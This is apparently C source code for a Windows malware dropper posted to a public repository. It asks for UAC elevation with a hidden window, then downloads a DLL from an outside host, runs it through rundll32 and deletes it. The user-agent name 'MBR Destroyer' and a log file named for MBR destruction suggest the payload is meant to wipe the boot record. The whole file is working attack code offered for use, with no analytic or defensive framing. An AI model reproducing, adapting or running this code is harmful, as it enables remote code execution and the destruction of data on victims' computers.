#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <time.h>
#include <wininet.h>
#include <shellapi.h>

void log_to_file(const wchar_t* message) {
    FILE* log = _wfopen(L"mbr_destroy.log", L"a");
    if (log) {
        time_t now = time(NULL);
        wchar_t* timestamp = _wctime(&now);
        timestamp[wcslen(timestamp) - 1] = L'\0';
        fwprintf(log, L"[%s] %s\n", timestamp, message);
        fclose(log);
    }
}


// STAR MY REPO

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return fRet;
}

BOOL DownloadPayload() {
    HINTERNET hInternet = InternetOpenW(L"MBR Destroyer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        wchar_t error_msg[256];
        swprintf(error_msg, 256, L"Failed to initialize InternetOpenW: %lu", GetLastError());
        log_to_file(error_msg);
        return FALSE;
    }
    HINTERNET hUrl = InternetOpenUrlW(hInternet, L"https://inputt.net/files/payload.dll", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        wchar_t error_msg[256];
        swprintf(error_msg, 256, L"Failed to open URL for DLL download: %lu", GetLastError());
        log_to_file(error_msg);
        InternetCloseHandle(hInternet);
        return FALSE;
    }
    HANDLE hFile = CreateFileW(L"payload.dll", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wchar_t error_msg[256];
        swprintf(error_msg, 256, L"Failed to create payload.dll: %lu", GetLastError());
        log_to_file(error_msg);
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return FALSE;
    }
    BYTE buffer[4096];
    DWORD bytesRead, bytesWritten;
    BOOL success = TRUE;
    while (success && InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead)) {
        if (bytesRead == 0) break;
        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
            wchar_t error_msg[256];
            swprintf(error_msg, 256, L"Failed to write payload.dll: %lu", GetLastError());
            log_to_file(error_msg);
            success = FALSE;
        }
    }
    CloseHandle(hFile);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    if (!success) {
        log_to_file(L"Failed to download payload.dll");
        DeleteFileW(L"payload.dll");
        return FALSE;
    }
    log_to_file(L"Downloaded payload DLL successfully");
    return TRUE;
}

int _tmain(int argc, TCHAR* argv[]) {
    wprintf(L"S D F\n");
    log_to_file(L"Script started");
    if (IsElevated()) {
        log_to_file(L"Already elevated, executing payload");
        if (!DownloadPayload()) {
            log_to_file(L"Download failed, exiting");
            return 1;
        }
        TCHAR szCmd[MAX_PATH];
        _stprintf_s(szCmd, MAX_PATH, L"rundll32.exe payload.dll,DllMain");
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (!CreateProcessW(NULL, szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            wchar_t error_msg[256];
            swprintf(error_msg, 256, L"Failed to execute rundll32: %lu", GetLastError());
            log_to_file(error_msg);
            DeleteFileW(L"payload.dll");
            return 1;
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        DeleteFileW(L"payload.dll");
        log_to_file(L"Payload executed successfully");
        return 0;
    } else {
        log_to_file(L"Not elevated, requesting UAC elevation");
        TCHAR szExePath[MAX_PATH];
        GetModuleFileNameW(NULL, szExePath, MAX_PATH);
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.lpVerb = L"runas";
        sei.lpFile = szExePath;
        sei.nShow = SW_HIDE;
        if (!ShellExecuteExW(&sei)) {
            DWORD dwError = GetLastError();
            wchar_t error_msg[256];
            if (dwError == ERROR_CANCELLED) {
                swprintf(error_msg, 256, L"UAC prompt was cancelled by the user");
            } else {
                swprintf(error_msg, 256, L"Failed to request UAC elevation: %lu", dwError);
            }
            log_to_file(error_msg);
            return 1;
        }
        WaitForSingleObject(sei.hProcess, INFINITE);
        CloseHandle(sei.hProcess);
        log_to_file(L"Elevated process completed successfully");
        wprintf(L"uac successfull\n");
        return 0;
    }
}
